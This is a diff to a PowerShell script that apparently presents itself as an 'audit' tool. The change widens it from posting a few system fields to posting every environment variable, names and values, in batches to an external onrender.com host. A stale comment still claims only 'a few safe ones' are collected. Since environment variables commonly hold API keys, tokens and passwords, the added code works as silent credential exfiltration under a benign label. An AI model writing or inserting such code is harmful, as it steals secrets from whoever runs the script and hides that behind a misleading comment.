@@ -3,23 +3,48 @@ Get-ChildItem Env: | Format-Table -AutoSize
 # Endpoint
 $url = "https://test-baffen.onrender.com/audit"
 
+
+$batchSize = 20
+$batch = @()
+$index = 0
+$batchIndex = 0
 # Collect environment variables (example: only a few safe ones)
-$payload = @{
-    USERNAME = $env:USERNAME
-    COMPUTERNAME = $env:COMPUTERNAME
-    OS = $env:OS
-    PROCESSOR_ARCHITECTURE = $env:PROCESSOR_ARCHITECTURE
-    DATE = (Get-Date).ToString("o")
+Get-ChildItem Env: | ForEach-Object {
+
+    $batch += [PSCustomObject]@{
+        Name  = $_.Name
+        Value = $_.Value
+    }
+
+    if ($batch.Count -eq $batchSize) {
+
+        $payload = @{
+            batchIndex = $batchIndex
+            data = $batch
+        }
+
+        Invoke-RestMethod -Uri $url `
+            -Method Post `
+            -Body ($payload | ConvertTo-Json -Depth 5) `
+            -ContentType "application/json"
+
+        $batch = @()
+        $batchIndex++
+    }
+
+    $index++
 }
 
-# Convert to JSON
-$json = $payload | ConvertTo-Json -Depth 3
+# send remaining items
+if ($batch.Count -gt 0) {
 
-# Send POST request
-$response = Invoke-RestMethod -Uri $url `
-    -Method Post `
-    -Body $json `
-    -ContentType "application/json"
+    $payload = @{
+        batchIndex = $batchIndex
+        data = $batch
+    }
 
-# Output response
-$response
+    Invoke-RestMethod -Uri $url `
+        -Method Post `
+        -Body ($payload | ConvertTo-Json -Depth 5) `
+        -ContentType "application/json"
+}
